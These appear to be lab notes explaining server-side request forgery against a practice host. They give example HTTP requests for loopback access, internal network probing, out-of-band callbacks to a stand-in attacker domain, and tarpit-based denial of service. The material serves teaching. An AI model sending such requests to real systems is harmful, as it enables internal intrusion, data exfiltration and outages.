## 🏠 Local Server Server-Side Request Forgery

In this attack scenario, unauthorized requests are forced against the server hosting the web application utilizing loopback IP addresses or the localhost hostname.


Vulnerabilities manifest when applications process URL parameters or API calls intended for internal file loading without adequate input validation. By manipulating the parameter, an attacker coerces the server to request and display restricted local resources.

```http
# Exploiting internal endpoint via local loopback
GET /?url=localhost/config HTTP/1.1
Host: hrms.thm
```
* Tool: Raw HTTP Client

## 🏢 Internal Network Access

Modern web applications frequently act as intermediaries between internet-facing front-ends and non-routable back-end infrastructure. Attackers manipulate vulnerable input fields to coerce the front-end server into interacting with internal resources on their behalf.


Inputs utilize specific internal IPv4 ranges (e.g., 192.168.x.x, 10.x.x.x) or internal domain names. If validation fails, the server blindly routes the request, bypassing external security controls and allowing the attacker to perform internal network reconnaissance or interact with administrative interfaces.

```http
# Forging request to internal database server
GET /?url=[http://internal-database.hrms.thm/](http://internal-database.hrms.thm/) HTTP/1.1
Host: hrms.thm
```
* Tool: Raw HTTP Client

## 📡 Blind Out-of-Band (OOB) SSRF

Out-of-band SSRF applies when the target server processes the forged request but does not return the response to the attacker. 


To confirm execution and exfiltrate data, the attacker forces the server to initiate an external connection, such as a DNS query or an HTTP request, to attacker-controlled infrastructure. This external interaction verifies the vulnerability and facilitates internal network mapping.

```http
# Forcing DNS resolution to attacker-controlled domain
GET /?url=[http://ssrf-callback.attacker-domain.com](http://ssrf-callback.attacker-domain.com) HTTP/1.1
Host: hrms.thm
```
* Tool: Raw HTTP Client

## 💥 Resource Exhaustion and Denial of Service

SSRF vectors can be weaponized to cause a Denial of Service (DoS) by forcing the target server to consume excessive resources.


The exploit involves supplying a URL pointing to an exceptionally large file or an artificially slow server (tarpit). When the vulnerable application initiates the fetch operation, it exhausts local system memory, bandwidth, or thread pools, resulting in severe degradation or complete system failure.

```http
# Triggering resource exhaustion via malicious external resource
GET /?url=[http://attacker-domain.com/massive-tarpit-file.bin](http://attacker-domain.com/massive-tarpit-file.bin) HTTP/1.1
Host: hrms.thm
```
* Tool: Raw HTTP Client
